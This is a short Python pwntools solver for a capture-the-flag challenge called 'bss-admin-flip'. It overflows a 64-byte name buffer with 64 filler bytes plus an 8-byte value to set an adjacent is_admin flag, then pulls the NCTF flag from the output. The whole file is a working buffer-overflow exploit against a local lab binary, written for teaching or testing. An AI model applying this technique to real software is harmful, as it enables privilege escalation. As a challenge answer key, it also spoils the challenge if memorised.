#!/usr/bin/env python3
"""Solver for bss-admin-flip.

`struct account { char name[64]; volatile long is_admin; }` lives in .bss, so
is_admin sits immediately after the 64-byte name buffer. read() accepts 128
bytes into name, so writing 64 filler bytes plus a non-zero 8-byte value lands
that value in is_admin and unlocks reveal().
"""
import os
import re

from pwn import context, process

context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")


def main() -> None:
    payload = b"A" * 64 + (1).to_bytes(8, "little")

    p = process(BIN)
    p.recvline()  # "register your name:"
    p.send(payload)
    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
